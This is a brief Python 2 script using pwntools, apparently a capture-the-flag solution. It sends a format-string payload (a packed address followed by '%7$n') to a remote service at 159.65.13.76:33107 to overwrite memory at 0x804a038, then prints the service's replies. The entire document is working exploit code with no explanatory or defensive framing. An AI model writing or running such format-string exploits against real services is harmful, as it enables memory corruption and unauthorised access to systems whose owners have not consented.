from pwn import *

payload = p32(0x804a038)+'%7$n'

p = remote('159.65.13.76', 33107)

print p.recv()
p.sendline(payload)
print p.recv()
print p.recv()
